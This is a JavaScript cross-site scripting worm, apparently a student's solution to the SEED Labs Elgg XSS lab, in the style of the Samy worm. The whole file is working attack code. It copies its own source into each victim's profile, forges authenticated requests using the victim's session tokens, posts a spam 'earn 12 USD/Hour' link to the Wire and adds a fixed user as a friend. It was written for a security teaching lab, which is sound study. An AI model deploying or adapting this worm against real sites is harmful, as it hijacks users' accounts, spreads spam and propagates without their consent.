<script id=worm> 
window.onload = function () {
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	console.log('hello')


    //Construct the content of your url
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
    var sendurl2="http://www.xsslabelgg.com/action/thewire/add";
        
    console.log('hemlo1');
    var namee = elgg.session.user.name;

    var userid = '&guid=' + elgg.page_owner.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var description = '&description=' + wormCode;
    var name = "&name=" + namee;
    var brief = '&briefdescription=' + 'hacking done';
    var idd = '&guid=' + elgg.session.user.guid;


    var data = ts + token + name + description + brief + idd;



    // posting on wire ************************************************************

    var name2 = elgg.session.user.username;
    var postdata = 'To earn 12 USD/Hour(!), visit now \n';
    var linkk = 'http://www.xsslabelgg.com/profile/'+name2;

    var data2 = new FormData();
    data2.append('__elgg_token', elgg.security.token.__elgg_token );
    data2.append('__elgg_ts', elgg.security.token.__elgg_ts);
    
    data2.append('body', postdata+linkk);
    //"__elgg_token="+elgg.security.token.__elgg_token + ts + '&body=' + postdata + linkk;

    // adding samy as friend ****************************************************

    var url3 = "http://www.xsslabelgg.com/action/friends/add?friend=47";
    //var userid3 = elgg.page_owner.guid;
    var sendurl3 = url3 + ts + token + ts + token; //FILL IN


    if(elgg.session.user.guid != elgg.page_owner.guid)
    {
		//Create and send Ajax request to modify profile
		var Ajax=null;
	    Ajax=new XMLHttpRequest();
	    Ajax.open("POST",sendurl,true);
	    Ajax.setRequestHeader("Cookie",document.cookie);
	    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    	Ajax.send(data);

    	var Ajax2=null;
	    Ajax2=new XMLHttpRequest();
	    Ajax2.open("POST",sendurl2,true);
	    Ajax2.setRequestHeader("Cookie",document.cookie);
	    Ajax2.send(data2);


	    Ajax.open("GET",sendurl3,true);
	    Ajax.send();	
	}


	//alert(jsCode);
}
</script>



			